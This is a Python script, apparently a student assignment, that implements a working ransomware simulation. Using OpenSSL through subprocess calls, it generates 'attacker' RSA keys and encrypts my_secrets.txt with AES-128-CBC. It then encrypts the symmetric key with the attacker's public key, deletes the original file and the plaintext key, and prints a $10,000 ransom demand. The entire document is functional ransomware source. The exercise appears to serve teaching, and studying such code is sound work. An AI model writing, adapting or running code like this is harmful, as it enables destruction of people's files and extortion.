import subprocess
import os
import sys
from datetime import datetime

# Mandatory Assignment Header 
author = "Dominic Whye"
current_date = datetime.now().strftime("%d/%m/%Y")
print(f"Author: {author}")
print(f"Date: {current_date}")

def run_command(command):
    """helper to execute shell commands via subprocess"""
    return subprocess.run(command, shell=True, capture_output=True, text=True)

def setup_attacker_keys():
    """Generates attacker's RSA key pair"""
    print("[*] Generating attacker RSA keys...")
    run_command("openssl genrsa -out attacker_private.pem 2048")
    run_command("openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem")

def encrypt_files():
    # Generate a 16-byte symmetric key using OpenSSL [cite: 62-63]
    print("[*] Generating symmetric key...")
    run_command("openssl rand -base64 16 > key.txt")

    # Encrypt my_secrets.txt using the symmetric key (AES-128-CBC) 
    
    print("[*] Encrypting data file with PBKDF2...")
    key = run_command("cat key.txt").stdout.strip()
    run_command(f"openssl enc -aes-128-cbc -salt -pbkdf2 -iter 10000 -in my_secrets.txt -out data_cipher.txt -pass pass:{key} -base64")

    # Encrypt key.txt using pkeyutl (OpenSSL 3.0 replacement for rsautl) 
    print("[*] Encrypting symmetric key with RSA (pkeyutl)...")
    run_command("openssl pkeyutl -encrypt -pubin -inkey attacker_public.pem -in key.txt -out key_cipher.bin")
    
    # Convert the binary cipher to base64 to meet requirement 
    run_command("base64 key_cipher.bin > key_cipher.txt")
    
    # Delete original and temporary files 
    print("[*] Cleaning up files...")
    if os.path.exists("key_cipher.bin"): os.remove("key_cipher.bin")
    if os.path.exists("key.txt"): os.remove("key.txt")
    if os.path.exists("my_secrets.txt"): os.remove("my_secrets.txt")

    # 7) Display ransom message 
    print("\n" + "="*50)
    print("Your file my_secrets.txt is encrypted.")
    print("To decrypt it, you need to pay me $10,000 and send key_cipher.txt to me.")
    print("="*50)

if __name__ == "__main__":
    # Ensure keys exist 
    setup_attacker_keys()
    
    # Check if target file exists before starting
    if os.path.exists("my_secrets.txt"):
        encrypt_files()
    else:
        print("[!] Error: my_secrets.txt not found in directory.")